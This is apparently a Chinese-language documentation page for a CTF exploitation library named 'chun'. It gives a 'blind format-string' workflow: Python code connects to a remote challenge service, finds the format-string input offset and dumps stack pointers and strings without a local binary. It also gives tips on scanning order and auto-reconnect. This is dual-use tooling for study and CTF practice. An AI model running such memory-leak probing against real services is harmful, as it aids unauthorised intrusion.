# Blind FMT 推荐工作流

## 目标

在没有本地 ELF 的条件下，用 `Blind` 先建立输入偏移和栈情报。

## 工作流

```python
from chun import Tool

p = Tool("./challenge", host="example.com", port=31337, remote_mode=True)

def io_factory():
    return p.start(remote_mode=True)

def interact(io, payload: bytes) -> bytes | None:
    io.sendline(payload)
    return io.recvline(timeout=1)

blind = p.new_blind_tool(io_factory=io_factory, interact_func=interact, delay=0.05)

offset = blind.find_input_offset(marker=b"PwnTool", max_range=40)
stack = blind.dump_stack_ptrs(1, 60)
strings = blind.dump_strings(1, 40)

p.show()
```

## 实践要点

- 先 `find_input_offset()` 再大范围扫栈，效率更高
- 开启 Registry 回写后，后续分析可以直接消费 `fmt.*` 记录
- 盲打失败要视为常态，依赖自动重连继续推进
